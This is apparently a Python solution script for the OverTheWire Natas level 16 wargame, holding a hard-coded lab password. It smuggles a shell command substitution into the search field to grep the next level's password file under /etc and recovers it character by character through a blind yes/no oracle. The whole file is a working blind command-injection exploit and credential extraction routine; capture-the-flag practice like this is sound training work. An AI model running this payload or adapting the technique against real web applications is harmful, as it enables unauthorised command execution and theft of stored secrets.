import requests
import string

url = 'http://natas16.natas.labs.overthewire.org'
username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

characters = string.ascii_letters + string.digits
flag = ''

for i in range(32):
    for char in characters:
        command = '$(grep -E ^%s%c.* /etc/natas_webpass/natas17)Asians' % (flag, char)
        response = requests.get(url, auth=(username, password), params={"needle" : command})

        # query success, the word "Asians" is not grep-ed as it's combined with the inner grep
        # if the inner grep output is empty, "Asians" will be grepped
        # if the inner grep output is not empty, "Asians" will not be grepped
        if "Asians" not in response.text:
            flag += char
            print(f'Building flag: {flag}')
            break

print(f'Complete flag: {flag}')
